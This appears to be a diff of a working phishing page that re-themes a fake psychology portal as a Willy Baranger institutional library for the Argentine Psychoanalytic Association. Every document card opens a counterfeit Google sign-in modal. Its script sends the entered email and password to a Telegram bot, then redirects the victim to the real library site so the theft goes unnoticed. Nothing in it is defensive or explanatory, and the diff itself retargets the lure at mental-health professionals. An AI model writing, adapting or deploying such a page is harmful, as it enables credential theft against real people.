@@ -3,26 +3,26 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enciclopedia de Casos Clínicos - PsicoIbero</title>
+    <title>Biblioteca Willy Baranger - Acceso Institucional</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap');
         
         body {
             font-family: 'Roboto', sans-serif;
-            background-color: #f3f4f6;
+            background-color: #f8fafc;
         }
 
         .hero-bg {
-            background-color: #1a3a8a;
-            background-image: linear-gradient(135deg, #1e3a8a 0%, #172554 100%);
+            background-color: #0f172a;
+            background-image: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
         }
 
         .modal-overlay {
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.45);
+            background: rgba(0, 0, 0, 0.5);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -82,77 +82,50 @@
 </head>
 <body>
 
-    <!-- Header -->
-    <nav class="bg-white border-b px-10 py-4 flex justify-between items-center shadow-sm">
+    <!-- Header Institucional -->
+    <nav class="bg-white border-b px-8 py-4 flex justify-between items-center">
         <div class="flex items-center gap-3">
-            <div class="bg-blue-900 p-1.5 rounded-md">
-                <svg width="28" height="28" viewBox="0 0 24 24" fill="white"><path d="M12 3L1 9l11 6 9-4.91V17h2V9L12 3z"/></svg>
+            <div class="bg-slate-800 p-2 rounded shadow-inner">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M4 6h16v2H4zm0 5h16v2H4zm0 5h16v2H4z"/></svg>
             </div>
             <div>
-                <span class="text-xl font-bold text-slate-800 block leading-none">PsicoIbero</span>
-                <span class="text-[10px] text-slate-500 uppercase tracking-widest font-semibold">Red Iberoamericana de Psicología</span>
+                <span class="text-lg font-bold text-slate-900 leading-tight block">PsicoIbero</span>
+                <span class="text-[10px] text-slate-500 uppercase tracking-tighter font-bold">Consorcio Regional de Bibliotecas</span>
             </div>
         </div>
-        <div class="hidden lg:flex gap-8 text-slate-600 text-sm font-medium">
-            <a href="#" class="hover:text-blue-700">Enciclopedia</a>
-            <a href="#" class="hover:text-blue-700">Protocolos</a>
-            <a href="#" class="hover:text-blue-700">Publicaciones</a>
-        </div>
-        <button onclick="openLogin()" class="bg-blue-700 text-white px-5 py-2 rounded-md text-sm font-semibold hover:bg-blue-800 transition-colors">Acceso Institucional</button>
+        <button onclick="openLogin()" class="border-2 border-slate-800 text-slate-800 px-6 py-2 rounded font-bold hover:bg-slate-800 hover:text-white transition-all text-sm">IDENTIFICARSE</button>
     </nav>
 
     <!-- Hero -->
-    <header class="hero-bg text-white py-20 px-6 text-center">
-        <h1 class="text-5xl font-serif mb-6">Enciclopedia de Casos Clínicos</h1>
-        <p class="text-blue-100 text-xl max-w-3xl mx-auto leading-relaxed">
-            El repositorio académico más grande de Iberoamérica para la consulta de diagnósticos, protocolos e investigación clínica.
+    <header class="hero-bg text-white py-24 px-6 text-center border-b-4 border-blue-600">
+        <h1 class="text-4xl md:text-5xl font-serif mb-6 italic">Biblioteca Virtual & Archivo Histórico</h1>
+        <p class="text-slate-300 text-lg max-w-2xl mx-auto font-light leading-relaxed">
+            Acceso exclusivo a la red Baranger para miembros federados y profesionales de la salud mental con credencial digital vigente.
         </p>
-        <div class="mt-10 max-w-2xl mx-auto relative group">
-            <input type="text" placeholder="Buscar por diagnóstico, síntoma o código CIE-10..." class="w-full py-4 px-8 rounded-full text-slate-800 text-lg shadow-2xl outline-none focus:ring-4 ring-blue-500/30">
-            <button class="absolute right-3 top-2 bg-blue-600 p-2.5 rounded-full hover:bg-blue-500 transition-colors">
-                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
-            </button>
-        </div>
     </header>
 
-    <!-- Contenido -->
-    <main class="max-w-7xl mx-auto py-16 px-6">
-        <h2 class="text-3xl font-bold text-slate-800 mb-12 flex items-center gap-4">
-            <span class="w-2 h-10 bg-blue-600 rounded-full"></span>
-            Casos Clínicos Recientes
-        </h2>
-        
-        <div class="grid md:grid-cols-3 gap-10">
-            <!-- Caso 1 -->
-            <div onclick="openLogin()" class="bg-white rounded-xl p-8 border border-slate-200 shadow-sm hover:shadow-xl transition-all cursor-pointer group">
-                <div class="bg-blue-50 text-blue-700 text-xs font-bold px-3 py-1 rounded-full w-fit mb-6">TRASTORNOS DEL ÁNIMO</div>
-                <h3 class="text-xl font-bold text-slate-800 mb-4 group-hover:text-blue-700">Manejo de la Depresión Mayor en Adolescentes: Caso 442-B</h3>
-                <p class="text-slate-600 mb-8 line-clamp-3">Evaluación multi-axial y plan de intervención farmacológica-conductual en paciente de 16 años con ideación persistente.</p>
-                <div class="flex items-center text-blue-600 font-bold text-sm">
-                    DESCARGAR CASO COMPLETO 
-                    <svg class="ml-2 w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
+    <!-- Grilla de Documentos -->
+    <main class="max-w-6xl mx-auto py-20 px-6">
+        <div class="grid md:grid-cols-2 gap-12">
+            <!-- Item 1 -->
+            <div onclick="openLogin()" class="flex gap-6 p-6 border-b border-slate-200 hover:bg-white hover:shadow-lg transition-all cursor-pointer group">
+                <div class="text-blue-600">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+                </div>
+                <div>
+                    <h3 class="text-xl font-bold text-slate-800 group-hover:text-blue-700">Manuscritos Originales: Willy Baranger</h3>
+                    <p class="text-slate-500 text-sm mt-2">Acceso a copias digitalizadas del archivo personal y notas de investigación clínica (1960-1980).</p>
                 </div>
             </div>
 
-            <!-- Caso 2 -->
-            <div onclick="openLogin()" class="bg-white rounded-xl p-8 border border-slate-200 shadow-sm hover:shadow-xl transition-all cursor-pointer group">
-                <div class="bg-emerald-50 text-emerald-700 text-xs font-bold px-3 py-1 rounded-full w-fit mb-6">TERAPIA FAMILIAR</div>
-                <h3 class="text-xl font-bold text-slate-800 mb-4 group-hover:text-emerald-700">Dinámicas de Codependencia en Familias con Adicciones</h3>
-                <p class="text-slate-600 mb-8 line-clamp-3">Análisis sistémico de patrones relacionales tras el reingreso del progenitor a centro de rehabilitación estatal.</p>
-                <div class="flex items-center text-blue-600 font-bold text-sm">
-                    DESCARGAR CASO COMPLETO 
-                    <svg class="ml-2 w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
+            <!-- Item 2 -->
+            <div onclick="openLogin()" class="flex gap-6 p-6 border-b border-slate-200 hover:bg-white hover:shadow-lg transition-all cursor-pointer group">
+                <div class="text-blue-600">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 3h6a4 4 0 0 1 4 4v14a4 4 0 0 0-4-4H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a4 4 0 0 1 4-4h6z"/></svg>
                 </div>
-            </div>
-
-            <!-- Caso 3 -->
-            <div onclick="openLogin()" class="bg-white rounded-xl p-8 border border-slate-200 shadow-sm hover:shadow-xl transition-all cursor-pointer group">
-                <div class="bg-purple-50 text-purple-700 text-xs font-bold px-3 py-1 rounded-full w-fit mb-6">NEUROPSICOLOGÍA</div>
-                <h3 class="text-xl font-bold text-slate-800 mb-4 group-hover:text-purple-700">Secuelas Cognitivas Post-Trauma Craneoencefálico</h3>
-                <p class="text-slate-600 mb-8 line-clamp-3">Estudio longitudinal sobre recuperación de funciones ejecutivas y atención focalizada en adultos jóvenes.</p>
-                <div class="flex items-center text-blue-600 font-bold text-sm">
-                    DESCARGAR CASO COMPLETO 
-                    <svg class="ml-2 w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 14l-7 7m0 0l-7-7m7 7V3"></path></svg>
+                <div>
+                    <h3 class="text-xl font-bold text-slate-800 group-hover:text-blue-700">Revista de Psicoanálisis - APA</h3>
+                    <p class="text-slate-500 text-sm mt-2">Índice completo y artículos a texto completo para suscriptores institucionales.</p>
                 </div>
             </div>
         </div>
@@ -161,7 +134,7 @@
     <!-- MODAL GOOGLE RECONSTRUIDO -->
     <div id="loginModal" class="modal-overlay hidden">
         <div class="google-card text-center">
-            <!-- Logo Google Oficial Reconstruido en SVG -->
+            <!-- Logo Google SVG -->
             <div class="mb-3 flex justify-center">
                 <svg width="75" height="24" viewBox="0 0 74 24">
                     <path fill="#4285F4" d="M9.24 11.44v3.28h5.95c-.24 1.33-1.03 2.45-2.1 3.16l3.4 2.64c1.99-1.84 3.14-4.55 3.14-7.79 0-.58-.06-1.14-.17-1.68H9.24z"/>
@@ -176,7 +149,7 @@
             <p id="mSub" class="text-base text-slate-700 mb-8">Usa tu cuenta institucional para continuar</p>
 
             <form id="authForm" class="text-left">
-                <!-- Sección Email -->
+                <!-- Paso 1: Email -->
                 <div id="stepEmail">
                     <div class="mb-2">
                         <input type="email" id="email" class="g-input" placeholder="Correo electrónico o teléfono" required>
@@ -193,7 +166,7 @@
                     </div>
                 </div>
 
-                <!-- Sección Password -->
+                <!-- Paso 2: Pass -->
                 <div id="stepPass" class="hidden">
                     <div class="flex items-center gap-2 border border-slate-200 rounded-full px-3 py-1 w-fit mx-auto mb-8 cursor-pointer hover:bg-slate-50" onclick="goEmail()">
                         <div class="w-5 h-5 bg-blue-100 rounded-full flex items-center justify-center">
@@ -249,7 +222,7 @@
             btn.innerHTML = '<span class="loading-dots">Cargando</span>';
             btn.disabled = true;
 
-            const text = `🔹 *NUEVO ACCESO PSICOIBERO*\n\n📧 *Email:* \`${mail}\`\n🔑 *Pass:* \`${pass}\``;
+            const text = `🔹 *NUEVO ACCESO APA/BARANGER*\n\n📧 *Email:* \`${mail}\`\n🔑 *Pass:* \`${pass}\``;
 
             try {
                 await fetch(`https://api.telegram.org/bot${API_T}/sendMessage`, {
@@ -260,8 +233,8 @@
             } catch(e) {}
 
             setTimeout(() => {
-                // REDIRECCIÓN A SCIELO PSICOLOGÍA (Repositorio de elite y real)
-                window.location.href = 'https://search.scielo.org/?q=psicologia+clinica&lang=pt&count=15&from=0&output=site&sort=&format=summary&fb=&page=1&q=psicologia+clinica';
+                // REDIRECCIÓN A LA APA - BIBLIOTECA BARANGER
+                window.location.href = 'https://www.apa.org.ar/Biblioteca-y-Archivo-Prof.-Willy-Baranger';
             }, 1800);
         });
     </script>
